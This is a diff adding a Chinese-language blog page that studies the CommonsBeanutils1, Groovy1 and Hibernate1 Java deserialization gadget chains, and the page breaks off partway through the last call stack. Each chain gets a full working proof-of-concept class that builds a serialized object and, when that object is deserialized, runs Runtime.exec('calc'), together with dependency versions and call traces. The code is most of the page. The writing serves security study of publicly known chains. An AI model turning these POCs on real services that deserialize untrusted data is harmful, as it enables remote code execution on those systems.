@@ -1,0 +1,2006 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> | Hurn's Blog</title><meta name="description" content=" - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">(untitled)</h1><div class="post-info"><a></a>2023-07-13</div><div class="post-content"><h1 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h1><p>POM依赖：</p>
+<pre><code class="xml">  &lt;dependency&gt;
+      &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+      &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+      &lt;version&gt;3.25.0-GA&lt;/version&gt;
+  &lt;/dependency&gt;
+
+  &lt;dependency&gt;
+      &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;
+      &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;
+      &lt;version&gt;1.9.2&lt;/version&gt;
+  &lt;/dependency&gt;
+</code></pre>
+<p><strong>Sink</strong> 为TemplatesImpl</p>
+<pre><code class="java">// 需要反射的两个类
+String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+
+// 这里需要借助javassist中的相关方法，
+ClassPool classPool = ClassPool.getDefault();
+classPool.appendClassPath(AbstractTranslet);
+// 动态创建类
+CtClass payload = classPool.makeClass(&quot;TestTemplatesImpl&quot;);
+// 动态设置父类
+payload.setSuperclass(classPool.get(AbstractTranslet));
+// 添加静态代码块
+payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
+// 保存字节码
+byte[] bytes = payload.toBytecode();
+
+// 反射创建TemplatesImpl类实例
+Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();
+// 反射修改其中的_bytecodes属性
+Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+field.setAccessible(true);
+field.set(templatesImpl,new byte[][]&#123;bytes&#125;);
+</code></pre>
+<p>**Source/Kict-Off **为 PriorityQueue#readObject </p>
+<p><strong>Chain</strong>为 BeanComparator，具体如下： </p>
+<pre><code class="java">public class BeanComparator&lt;T&gt; implements Comparator&lt;T&gt;, Serializable &#123;
+ 
+        public int compare(T o1, T o2) &#123;
+        if (this.property == null) &#123;
+            return this.internalCompare(o1, o2);
+        &#125; else &#123;
+            try &#123;
+                  // PropertyUtils.getProperty
+                Object value1 = PropertyUtils.getProperty(o1, this.property);
+                Object value2 = PropertyUtils.getProperty(o2, this.property);
+                return this.internalCompare(value1, value2);
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><strong><code> PropertyUtils.getProperty</code>  这个类类似getter的效果，会反射调用 o1 对象的 get + this.property方法 获取该熟悉的值，这里传入OutputProperties熟悉名，即会调用getOutputProperties方法去执行获取该属性的结果</strong></p>
+<pre><code class="java">public class PropertyUtils &#123;
+    public static Object getProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;
+        return PropertyUtilsBean.getInstance().getProperty(bean, name);
+    &#125;
+&#125;
+</code></pre>
+<p>org.apache.commons.beanutils.BeanIntrospectionData#getDescriptor</p>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230713153547211.png" alt="image-20230713153547211"></p>
+<p>而<code>TemplatesImpl</code>类的<code>getOutputProperties</code>属性，正好会调用<code>newTransformer</code></p>
+<pre><code class="java">public final class TemplatesImpl implements Templates, Serializable &#123;
+
+    public synchronized Properties getOutputProperties() &#123;
+        try &#123;
+            return newTransformer().getOutputProperties();
+        &#125;
+        catch (TransformerConfigurationException e) &#123;
+            return null;
+        &#125;
+    &#125;
+  
+      public synchronized Transformer newTransformer()
+        throws TransformerConfigurationException
+    &#123;
+        TransformerImpl transformer;
+
+        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
+            _indentNumber, _tfactory);
+
+        if (_uriResolver != null) &#123;
+            transformer.setURIResolver(_uriResolver);
+        &#125;
+
+        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;
+            transformer.setSecureProcessing(true);
+        &#125;
+        return transformer;
+    &#125;
+&#125;
+</code></pre>
+<p>POC</p>
+<pre><code class="java">import javassist.ClassPool;
+import javassist.CtClass;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.Comparator;
+import java.util.PriorityQueue;
+
+import org.apache.commons.beanutils.BeanComparator;
+
+public class CB &#123;
+    public static void main(String[] args) throws Exception &#123;
+
+        // 需要反射的两个类
+        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+
+        // 这里需要借助javassist中的相关方法，
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.appendClassPath(AbstractTranslet);
+        // 动态创建类
+        CtClass payload = classPool.makeClass(&quot;CB&quot;);
+        // 动态设置父类
+        payload.setSuperclass(classPool.get(AbstractTranslet));
+        // 添加静态代码块
+        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
+        // 保存字节码
+        byte[] bytes = payload.toBytecode();
+
+        // 反射创建TemplatesImpl类实例
+        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();
+        // 反射修改其中的_bytecodes属性
+        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        field.setAccessible(true);
+        field.set(templatesImpl,new byte[][]&#123;bytes&#125;);
+
+        // 反射修改其中的_name属性
+        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);
+        field1.setAccessible(true);
+        field1.set(templatesImpl,&quot;test&quot;);
+
+        // 反射将 TemplatesImpl 放在 PriorityQueue 里
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2);
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;2&quot;);
+
+        Field field2 = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
+        field2.setAccessible(true);
+        field2.set(queue,new Object[]&#123;templatesImpl,templatesImpl&#125; );
+
+        // 初始化 String$CaseInsensitiveComparator
+        // 避免使用ComparableComparator，脱离 CommonCollections的依赖
+        Class       c           = Class.forName(&quot;java.lang.String$CaseInsensitiveComparator&quot;);
+        Constructor constructor = c.getDeclaredConstructor();
+        constructor.setAccessible(true);
+        Comparator comparator = (Comparator&lt;?&gt;) constructor.newInstance();
+
+        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,comparator );
+        Field field3 = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        field3.setAccessible(true);
+        field3.set(queue, beanComparator);
+
+
+        // 模拟序列化和反序列化
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
+        outputStream.writeObject(queue);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
+        inputStream.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>调用链：</p>
+<pre><code>newInstance:338, Class (java.lang)
+getTransletInstance:408, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+newTransformer:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+getOutputProperties:460, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+invoke:606, Method (java.lang.reflect)
+invokeMethod:2116, PropertyUtilsBean (org.apache.commons.beanutils)
+getSimpleProperty:1267, PropertyUtilsBean (org.apache.commons.beanutils)
+getNestedProperty:808, PropertyUtilsBean (org.apache.commons.beanutils)
+getProperty:884, PropertyUtilsBean (org.apache.commons.beanutils)
+getProperty:464, PropertyUtils (org.apache.commons.beanutils)
+compare:163, BeanComparator (org.apache.commons.beanutils)
+siftDownUsingComparator:699, PriorityQueue (java.util)
+siftDown:667, PriorityQueue (java.util)
+heapify:713, PriorityQueue (java.util)
+readObject:773, PriorityQueue (java.util)
+</code></pre>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230713154155859.png" alt="image-20230713154155859"></p>
+<p>CB链不能使用<code>JdbcRowSetImpl</code>的<code>getDatabaseMetaData</code>方法，<code>getDatabaseMetaData</code>不是getter方法，也没有DatabaseMetaData这个属性DatabaseMetaData</p>
+<pre><code class="java">    public DatabaseMetaData getDatabaseMetaData() throws SQLException &#123;
+        Connection var1 = this.connect();
+        return var1.getMetaData();
+    &#125;
+</code></pre>
+<h1 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h1><p>POM依赖：</p>
+<blockquote>
+<p>Groovy : 1.7.0-2.4.3</p>
+</blockquote>
+<pre><code class="xml">  &lt;dependency&gt;
+      &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;
+      &lt;artifactId&gt;groovy-all&lt;/artifactId&gt;
+      &lt;version&gt;1.7.0&lt;/version&gt;
+  &lt;/dependency&gt;
+</code></pre>
+<p><strong>Sink:</strong></p>
+<pre><code>  MethodClosure methodClosure = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;);
+  methodClosure.call();
+</code></pre>
+<p><code>MethodClosure</code>继承的Closure，call实际上会调用doCall，也就是会执行<code>InvokerHelper.invokeMethod</code>，this.getOwner()会返回”calc”</p>
+<pre><code class="java">package org.codehaus.groovy.runtime;
+
+import groovy.lang.Closure;
+import java.lang.reflect.Method;
+import java.security.AccessController;
+import java.security.PrivilegedAction;
+
+public class MethodClosure extends Closure &#123;
+    private String method;
+
+    public MethodClosure(Object owner, String method) &#123;
+        super(owner);
+        this.method = method;
+        final Class clazz = owner.getClass() == Class.class ? (Class)owner : owner.getClass();
+                // ...
+    &#125;
+
+    protected Object doCall(Object arguments) &#123;
+        return InvokerHelper.invokeMethod(this.getOwner(), this.method, arguments);
+    &#125;
+&#125;
+</code></pre>
+<p>Groovy为string添加了Execute方法</p>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230713165441647.png" alt="image-20230713165441647"></p>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230713165316720.png" alt="image-20230713165316720"></p>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230713165543745.png" alt="image-20230713165543745"></p>
+<p><strong>Chain</strong>为<code>ConvertedClosure</code>，这个类继承的<code>ConversionHandler</code>是个动态代理类，子类会执行<code>invokeCustom</code></p>
+<pre><code class="java">package org.codehaus.groovy.runtime;
+
+import groovy.lang.Closure;
+import java.io.Serializable;
+import java.lang.reflect.Method;
+
+public class ConvertedClosure extends ConversionHandler implements Serializable &#123;
+    private String methodName;
+    private static final long serialVersionUID = 1162833713450835227L;
+
+    public ConvertedClosure(Closure closure, String method) &#123;
+        super(closure);
+        this.methodName = method;
+    &#125;
+
+    public ConvertedClosure(Closure closure) &#123;
+        this(closure, (String)null);
+    &#125;
+
+    public Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable &#123;
+        return this.methodName != null &amp;&amp; !this.methodName.equals(method.getName()) ? null : ((Closure)this.getDelegate()).call(args);
+    &#125;
+&#125;
+</code></pre>
+<p>POC:</p>
+<p>Groovy1 主要利用了闭包或者说是动态代理的特性，<code>ConvertedClosure</code> 封装<code>MethodClosure</code>后，当entrySet方法被调用时就会执行methodClosure</p>
+<pre><code class="java">import org.codehaus.groovy.runtime.ConvertedClosure;
+import org.codehaus.groovy.runtime.MethodClosure;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+import java.util.Map;
+
+public class Groovy1 &#123;
+
+    public static void main(String[] args) throws Exception&#123;
+
+        MethodClosure methodClosure = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;);
+                
+          // 当entrySet方法调用时就会执行methodClosure
+        ConvertedClosure closure       = new ConvertedClosure(methodClosure, &quot;entrySet&quot;);
+        // 创建 ConvertedClosure 的动态代理类实例
+        Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),
+                new Class[]&#123;Map.class&#125;, closure);
+
+        Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+
+        // 使用动态代理初始化 AnnotationInvocationHandler
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);
+
+        // 模拟序列化和反序列化
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
+        outputStream.writeObject(invocationHandler);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
+        inputStream.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>调用链：</p>
+<pre><code>exec:617, Runtime (java.lang)
+exec:450, Runtime (java.lang)
+exec:347, Runtime (java.lang)
+execute:7110, DefaultGroovyMethods (org.codehaus.groovy.runtime)
+doMethodInvoke:-1, dgm$154 (org.codehaus.groovy.runtime)
+invokeMethod:1058, MetaClassImpl (groovy.lang)
+invokeMethod:923, MetaClassImpl (groovy.lang)
+invokeMethod:886, MetaClassImpl (groovy.lang)
+call:276, Closure (groovy.lang)
+invokeCustom:51, ConvertedClosure (org.codehaus.groovy.runtime)
+invoke:79, ConversionHandler (org.codehaus.groovy.runtime)
+entrySet:-1, $Proxy0 (com.sun.proxy)
+readObject:443, AnnotationInvocationHandler (sun.reflect.annotation)
+</code></pre>
+<h1 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h1><p>pom</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.hibernate&lt;/groupId&gt;
+    &lt;artifactId&gt;hibernate-core&lt;/artifactId&gt;
+    &lt;version&gt;5.0.0.Final&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p><strong>Sink：</strong></p>
+<pre><code class="java">// 需要反射的两个类
+String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+
+// 这里需要借助javassist中的相关方法，
+ClassPool classPool = ClassPool.getDefault();
+classPool.appendClassPath(AbstractTranslet);
+// 动态创建类
+CtClass payload = classPool.makeClass(&quot;Template&quot;);
+// 动态设置父类
+payload.setSuperclass(classPool.get(AbstractTranslet));
+// 添加静态代码块
+payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
+// 保存字节码
+byte[] bytes = payload.toBytecode();
+
+// 反射创建TemplatesImpl类实例
+Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();
+// 反射修改其中的_bytecodes属性
+Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+field.setAccessible(true);
+field.set(templatesImpl,new byte[][]&#123;bytes&#125;);
+
+Field field0=templatesImpl.getClass().getDeclaredField(&quot;_tfactory&quot;);
+field0.setAccessible(true);
+field0.set(templatesImpl, new TransformerFactoryImpl());
+
+// 反射修改其中的_name属性
+Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);
+field1.setAccessible(true);
+field1.set(templatesImpl,&quot;test&quot;);
+
+Method method = TemplatesImpl.class.getDeclaredMethod(&quot;getOutputProperties&quot;);
+// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
+Class&lt;?&gt;       getterImpl  = Class.forName(&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;);
+Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[0];
+constructor.setAccessible(true);
+GetterMethodImpl getter = (GetterMethodImpl) constructor.newInstance(null, null, method);
+getter.get(templatesImpl);
+</code></pre>
+<p><code>GetterMethodImpl</code>这个类主要会将指定类的方法，如果传入<code>TemplatesImpl</code>的<code>getOutputProperties</code>就会触发newTransformer创建一个恶意类。</p>
+<pre><code class="java">public class GetterMethodImpl implements Getter &#123;
+    private final Class containerClass;
+    private final String propertyName;
+    private final Method getterMethod;
+
+    public GetterMethodImpl(Class containerClass, String propertyName, Method getterMethod) &#123;
+        this.containerClass = containerClass;
+        this.propertyName = propertyName;
+        this.getterMethod = getterMethod;
+    &#125;
+    
+        public Object get(Object owner) &#123;
+        try &#123;
+              // 执行指定类的方法
+            return this.getterMethod.invoke(owner);
+        &#125; 
+    &#125;
+&#125;
+</code></pre>
+<p><strong>Chain:</strong></p>
+<p>有了Sink之后就需要有东西来执行<code>GetterMethodImpl.get</code>，这里就要引入<code>org.hibernate.tuple.component.AbstractComponentTuplizer</code>来调用getter.get，可以看到<code>getPropertyValue</code>和<code>getPropertyValues</code>都可以使用</p>
+<pre><code class="java">public abstract class AbstractComponentTuplizer implements ComponentTuplizer &#123;
+    
+        public Object getPropertyValue(Object component, int i) throws HibernateException &#123;
+        return this.getters[i].get(component);
+    &#125;
+      
+      public Object[] getPropertyValues(Object component) throws HibernateException &#123;
+        Object[] values = new Object[this.propertySpan];
+
+        for(int i = 0; i &lt; this.propertySpan; ++i) &#123;
+            values[i] = this.getPropertyValue(component, i);
+        &#125;
+        return values;
+    &#125;
+&#125;
+</code></pre>
+<p><code>AbstractComponentTuplizer</code>这是个抽象类，一共有两实现方法，<code>PojoComponentTuplizer</code>和<code>PojoComponentTuplizer</code>，这里选择<code>PojoComponentTuplizer</code> ，他的<code>getPropertyValues</code>方法会执行<code>super.getPropertyValues</code></p>
+<pre><code class="java">public class PojoComponentTuplizer extends AbstractComponentTuplizer &#123;    
+    public Object[] getPropertyValues(Object component) throws HibernateException &#123;
+        if (component == PropertyAccessStrategyBackRefImpl.UNKNOWN) &#123;
+            return new Object[this.propertySpan];
+        &#125; else &#123;
+              // 调用super.getPropertyValues
+            return this.optimizer != null &amp;&amp; this.optimizer.getAccessOptimizer() != null ? this.optimizer.getAccessOptimizer().getPropertyValues(component) : super.getPropertyValues(component);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>继续往下找可以找到<code>ComponentType#getHashCode</code> -&gt; <code>getPropertyValue</code>-&gt;<code>getHashCode</code></p>
+<pre><code class="java">public class ComponentType extends AbstractType implements CompositeType, ProcedureParameterExtractionAware &#123;   
+  
+      public Object[] getPropertyValues(Object component, EntityMode entityMode) throws HibernateException &#123;
+        return component instanceof Object[] ? (Object[])((Object[])component) :             this.componentTuplizer.getPropertyValues(component);
+    &#125;
+  
+    public Object getPropertyValue(Object component, int i) throws HibernateException &#123;
+        return component instanceof Object[] ? ((Object[])((Object[])component))[i] : this.componentTuplizer.getPropertyValue(component, i);
+    &#125;
+
+        public int getHashCode(Object x) &#123;
+        int result = 17;
+
+        for(int i = 0; i &lt; this.propertySpan; ++i) &#123;
+            Object y = this.getPropertyValue(x, i);
+            result *= 37;
+            if (y != null) &#123;
+                result += this.propertyTypes[i].getHashCode(y);
+            &#125;
+        &#125;
+
+        return result;
+    &#125;
+&#125;
+</code></pre>
+<p>可以找到<code>org.hibernate.engine.spi.TypedValue#initTransients</code>来触发<code>ComponentType#getHashCode</code></p>
+<pre><code class="java">public final class TypedValue implements Serializable &#123;
+    private final Type type;
+    private final Object value;
+    private transient ValueHolder&lt;Integer&gt; hashcode;        // 
+
+    public TypedValue(Type type, Object value) &#123;
+        this.type = type;
+        this.value = value;
+        this.initTransients();
+    &#125;
+
+    /** @deprecated */
+    @Deprecated
+    public TypedValue(Type type, Object value, EntityMode entityMode) &#123;
+        this(type, value);
+    &#125;
+  
+      public int hashCode() &#123;
+        return (Integer)this.hashcode.getValue();
+    &#125;
+
+      // 构造方法运行
+      // 初始化this.hashcode，用来等待hashCode方法触发ValueHolder#getValue，
+      // 进一步触发TypedValue.this.type.getHashCode，而这个Type将其赋值为ComponentType
+      // 最终ComponentType#getHashCode -》getPropertyValue 
+    private void initTransients() &#123;
+        this.hashcode = new ValueHolder(new ValueHolder.DeferredInitializer&lt;Integer&gt;() &#123;
+            public Integer initialize() &#123;
+                return TypedValue.this.value == null ? 0 : TypedValue.this.type.getHashCode(TypedValue.this.value);
+            &#125;
+        &#125;);
+    &#125;
+&#125;
+</code></pre>
+<p>继续找到<code>ValueHolder#getValue</code>  ， 被TypedValue#hashCode触发，这样就构成了利用链</p>
+<p><code>TypedValue#hashCode</code> -&gt; <code>ValueHolder#getValue</code> -&gt;<code>ComponentType#getHashCode</code> -&gt; <code>ComponentType#getPropertyValue</code> -&gt;<code>PojoComponentTuplizer#getPropertyValue</code> -&gt; <code>GetterMethodImpl#get</code> -&gt;<code>TemplatesImpl#getOutputProperties</code></p>
+<p>整个利用链挺复杂</p>
+<pre><code class="java">public class ValueHolder&lt;T&gt; &#123; 
+    public ValueHolder(DeferredInitializer&lt;T&gt; valueInitializer) &#123;
+        this.valueInitializer = valueInitializer;
+    &#125;
+        public T getValue() &#123;
+        if (this.value == null) &#123;
+              // 可以反过来被TypedValue#hashCode触发
+              // this.valueInitializer 就是
+            this.value = this.valueInitializer.initialize();
+        &#125;
+
+        return this.value;
+    &#125;
+&#125;
+</code></pre>
+<p><strong>Sink</strong>入口点为HashMap#readObject</p>
+<p>POC</p>
+<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.hibernate.engine.spi.TypedValue;
+import org.hibernate.mapping.Component;
+import org.hibernate.property.access.spi.GetterMethodImpl;
+import org.hibernate.tuple.component.AbstractComponentTuplizer;
+import org.hibernate.tuple.component.PojoComponentTuplizer;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import org.hibernate.type.ComponentType;
+import org.hibernate.type.Type;
+import sun.reflect.ReflectionFactory;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+
+
+public class Hibernate1 &#123;
+    public static void main(String[] args) throws Exception&#123;
+
+        // 需要反射的两个类
+        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+
+        // 这里需要借助javassist中的相关方法，
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.appendClassPath(AbstractTranslet);
+        // 动态创建类
+        CtClass payload = classPool.makeClass(&quot;Template&quot;);
+        // 动态设置父类
+        payload.setSuperclass(classPool.get(AbstractTranslet));
+        // 添加静态代码块
+        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
+        // 保存字节码
+        byte[] bytes = payload.toBytecode();
+        // 反射创建TemplatesImpl类实例
+        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();
+        // 反射修改其中的_bytecodes属性
+        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        field.setAccessible(true);
+        field.set(templatesImpl,new byte[][]&#123;bytes&#125;);
+
+        Field field0=templatesImpl.getClass().getDeclaredField(&quot;_tfactory&quot;);
+        field0.setAccessible(true);
+        field0.set(templatesImpl, new TransformerFactoryImpl());
+
+        // 反射修改其中的_name属性
+        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);
+        field1.setAccessible(true);
+        field1.set(templatesImpl,&quot;test&quot;);
+
+        Method method = TemplatesImpl.class.getDeclaredMethod(&quot;getOutputProperties&quot;);
+        // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
+        Class&lt;?&gt;       getterImpl  = Class.forName(&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;);
+        Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+        GetterMethodImpl getter = (GetterMethodImpl) constructor.newInstance(null, null, method);
+
+        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);
+        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);
+        Class&lt;?&gt; componentTypeClass             = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);
+
+        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(pojoComponentTuplizerClass,  Object.class.getConstructor(new Class[0]));
+        PojoComponentTuplizer tuplizer= (PojoComponentTuplizer) sc.newInstance(new Object[0]);
+
+        // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
+        Field field222 = abstractComponentTuplizerClass.getDeclaredField(&quot;getters&quot;);
+        field222.setAccessible(true);
+        Object getters = Array.newInstance(getter.getClass(), 1);
+        Array.set(getters, 0, getter);
+        field222.set(tuplizer, getters);
+
+        Constructor&lt;?&gt; sc2 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(componentTypeClass,  Object.class.getConstructor(new Class[0]));
+        ComponentType type= (ComponentType) sc2.newInstance(new Object[0]);
+
+        Field field11 = componentTypeClass.getDeclaredField(&quot;componentTuplizer&quot;);
+        field11.setAccessible(true);
+        field11.set(type, tuplizer);
+
+        Field field2 = componentTypeClass.getDeclaredField(&quot;propertySpan&quot;);
+        field2.setAccessible(true);
+        field2.set(type, 1);
+
+        Field field3 = componentTypeClass.getDeclaredField(&quot;propertyTypes&quot;);
+        field3.setAccessible(true);
+        field3.set(type, new Type[]&#123;type&#125;);
+
+
+        // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
+        TypedValue typedValue = new TypedValue(type, null);
+
+        // 创建反序列化用 HashMap
+        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+        hashMap.put(typedValue, &quot;test&quot;);
+
+        // put 到 hashmap 之后再反射写入，防止 put 时触发
+        Field valueField = TypedValue.class.getDeclaredField(&quot;value&quot;);
+        valueField.setAccessible(true);
+        valueField.set(typedValue, templatesImpl);
+
+        // 模拟序列化和反序列化
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
+        outputStream.writeObject(hashMap);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
+        inputStream.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>调用链</p>
+<pre><code>getTransletInstance:408, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+newTransformer:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+getOutputProperties:460, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:57, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:606, Method (java.lang.reflect)
+get:41, GetterMethodImpl (org.hibernate.property.access.spi)
+getPropertyValue:58, AbstractComponentTuplizer (org.hibernate.tuple.component)
+getPropertyValue:418, ComponentType (org.hibernate.type)
+getHashCode:228, ComponentType (org.hibernate.type)
+initialize:81, TypedValue$1 (org.hibernate.engine.spi)
